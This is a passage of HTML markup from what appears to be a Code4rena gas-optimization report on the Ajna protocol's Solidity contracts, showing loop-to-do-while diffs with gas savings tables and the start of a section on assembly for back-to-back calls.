{</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             unchecked { ++i; }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        } while(i &lt; numVotesCast);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /// @inheritdoc IStandardFunding</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L582-L595\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L582-L595</a></p>\n<p><em>Gas Savings for <code>GrantFund.screeningVote</code>, obtained via protocol’s tests: Avg 167 gas</em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Max</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>399146</td>\n</tr>\n<tr>\n<td>After</td>\n<td>398979</td>\n</tr>\n</tbody>\n</table>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"199\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">ajna</span><span class=\"mtk1\">-</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">base</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StandardFunding</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">582</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">numVotesCast</span><span class=\"mtk1\">; ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">583</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">Proposal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_standardFundingProposals</span><span class=\"mtk1\">[</span><span class=\"mtk12\">voteParams_</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">584</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">585</span><span class=\"mtk1\">:            </span><span class=\"mtk3\">// check that the proposal is part of the current distribution period</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">586</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">distributionId</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">currentDistribution</span><span class=\"mtk1\">.</span><span class=\"mtk12\">id</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidVote</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">587</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">588</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">votes</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">voteParams_</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">votes</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">589</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">590</span><span class=\"mtk1\">:            </span><span class=\"mtk3\">// cast each successive vote</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">591</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">votesCast_</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">votes</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">592</span><span class=\"mtk1\">:            </span><span class=\"mtk11\">_screeningVote</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">, </span><span class=\"mtk12\">votes</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">593</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">594</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">unchecked</span><span class=\"mtk1\"> { ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">; }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">595</span><span class=\"mtk1\">:        }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"200\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/grants/base/StandardFunding.sol b/src/grants/base/StandardFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 928b337..649df77 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/grants/base/StandardFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/grants/base/StandardFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -578,8 +578,9 @@ abstract contract StandardFunding is Funding, IStandardFunding {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         if (block.number &lt; currentDistribution.startBlock || block.number &gt; _getScreeningStageEndBlock(currentDistribution.endBlock)) revert InvalidVote();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 numVotesCast = voteParams_.length;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        for (uint256 i = 0; i &lt; numVotesCast; ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint256 i;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        do {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             Proposal storage proposal = _standardFundingProposals[voteParams_[i].proposalId];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             // check that the proposal is part of the current distribution period</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -592,7 +593,7 @@ abstract contract StandardFunding is Funding, IStandardFunding {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             _screeningVote(msg.sender, proposal, votes);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             unchecked { ++i; }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        } while(i &lt; numVotesCast);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /*********************************/</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L848-L852\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L848-L852</a></p>\n<p><em>Gas Savings for <code>GrantFund.fundingVote</code>, obtained via protocol’s tests: Avg 456 gas</em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Max</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>409345</td>\n</tr>\n<tr>\n<td>After</td>\n<td>408889</td>\n</tr>\n</tbody>\n</table>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"201\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">ajna</span><span class=\"mtk1\">-</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">base</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StandardFunding</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">848</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">numVotesCast</span><span class=\"mtk1\">; ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">849</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">votesCastSumSquared_</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">Maths</span><span class=\"mtk1\">.</span><span class=\"mtk11\">wpow</span><span class=\"mtk1\">(</span><span class=\"mtk12\">SafeCast</span><span class=\"mtk1\">.</span><span class=\"mtk11\">toUint256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">Maths</span><span class=\"mtk1\">.</span><span class=\"mtk11\">abs</span><span class=\"mtk1\">(</span><span class=\"mtk12\">votesCast_</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">votesUsed</span><span class=\"mtk1\">)), </span><span class=\"mtk7\">2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">850</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">851</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">unchecked</span><span class=\"mtk1\"> { ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">; }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">852</span><span class=\"mtk1\">:        }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"202\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/grants/base/StandardFunding.sol b/src/grants/base/StandardFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 928b337..188e3db 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/grants/base/StandardFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/grants/base/StandardFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -844,12 +844,13 @@ abstract contract StandardFunding is Funding, IStandardFunding {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         FundingVoteParams[] memory votesCast_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     ) internal pure returns (uint256 votesCastSumSquared_) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 numVotesCast = votesCast_.length;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        for (uint256 i = 0; i &lt; numVotesCast; ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint256 i;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        do {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             votesCastSumSquared_ += Maths.wpow(SafeCast.toUint256(Maths.abs(votesCast_[i].votesUsed)), 2);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             unchecked { ++i; }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        } while(i &lt; numVotesCast);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /**</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L208-L214\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L208-L214</a></p>\n<p><em>Gas Savings for <code>GrantFund.startNewDistributionPeriod</code>, obtained via protocol’s tests: Avg 82 gas</em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Max</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>75597</td>\n</tr>\n<tr>\n<td>After</td>\n<td>75515</td>\n</tr>\n</tbody>\n</table>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"203\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">ajna</span><span class=\"mtk1\">-</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">base</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StandardFunding</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">208</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">numFundedProposals</span><span class=\"mtk1\">; ) {</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"204\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/grants/base/StandardFunding.sol b/src/grants/base/StandardFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 928b337..7e2d7db 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/grants/base/StandardFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/grants/base/StandardFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -204,14 +204,15 @@ abstract contract StandardFunding is Funding, IStandardFunding {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 totalTokensRequested;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 numFundedProposals = fundingProposalIds.length;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        for (uint i = 0; i &lt; numFundedProposals; ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint256 i;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        do {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             Proposal memory proposal = _standardFundingProposals[fundingProposalIds[i]];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             totalTokensRequested += proposal.tokensRequested;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             unchecked { ++i; }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        } while(i &lt; numFundedProposals);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // readd non distributed tokens to the treasury</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         treasury += (fundsAvailable - totalTokensRequested);</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L324-L330\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L324-L330</a></p>\n<p><em>Gas Savings for <code>GrantFund.updateSlate</code>, obtained via protocol’s tests: Avg 167 gas</em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Max</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>318329</td>\n</tr>\n<tr>\n<td>After</td>\n<td>318162</td>\n</tr>\n</tbody>\n</table>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"205\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">ajna</span><span class=\"mtk1\">-</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">grants</span><span class=\"mtk1\">/</span><span class=\"mtk12\">base</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StandardFunding</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">324</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">numProposalsInSlate</span><span class=\"mtk1\">; ) {</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"206\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/grants/base/StandardFunding.sol b/src/grants/base/StandardFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 928b337..67bee79 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/grants/base/StandardFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/grants/base/StandardFunding.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -320,14 +320,14 @@ abstract contract StandardFunding is Funding, IStandardFunding {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // if slate of proposals is new top slate, update state</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         if (newTopSlate_) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             uint256[] storage existingSlate = _fundedProposalSlates[newSlateHash];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            for (uint i = 0; i &lt; numProposalsInSlate; ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            uint256 i;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            do {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 // update list of proposals to fund</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 existingSlate.push(proposalIds_[i]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 unchecked { ++i; }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            } while(i &lt; numProposalsInSlate);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             // update hash to point to the new leading slate of proposals</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             currentDistribution.fundedSlateHash = newSlateHash;</span></span></span></code></pre>\n<h2 id=\"g-10-use-assembly-to-perform-efficient-back-to-back-calls\" style=\"position:relative;\"><a href=\"#g-10-use-assembly-to-perform-efficient-back-to-back-calls\" aria-label=\"g 10 use assembly to perform efficient back to back calls permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-10] Use assembly to perform efficient back-to-back calls</h2>\n<p>If a similar external call is performed back-to-back, we can use assembly to reuse any function signatures and function parameters that stay the same. In addition, we can also reuse the same memory space for each function call (<code>scratch space</code> + <code>free memory pointer</code> + <code>zero slot</code>), which can potentially allow us to avoid memory expansion costs.</p>\n<p><strong>Note: In order to do this optimization safely we will cache the free memory pointer value and restore it once we are done with our function calls. We will also set the zero slot back to 0 if neccessary</strong>.</p>\n<p>Total Instances: <code>3</code></p>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/RewardsManager.sol#L636-L651\">https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/RewardsManager.sol#L636-L651</a></p>\n<p><em>Gas Savings for <code>RewardsManager.claimRewards</code>, obtained via protocol’s tests: 2141 gas</em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Max</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>393064</td>\n</tr>\n<tr>\n<td>After</td>\n<td>390923</td>\n</tr>\n</tbody>\n</table>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"207\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">ajna</span><span class=\"mtk1\">-</span><span class=\"mtk12\">core</span><span class=\"mtk1\">/</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">RewardsManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">636</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_getPoolAccumulators</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">637:        </span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">pool_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">638:        </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk10\">currentBurnEventEpoch_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">639:        </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk10\">lastBurnEventEpoch_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">640</span><span class=\"mtk1\">:    ) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">641</span><span class=\"mtk1\">:        (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">642</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">currentBurnTime</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">643</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">totalInterestLatest</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">644</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> 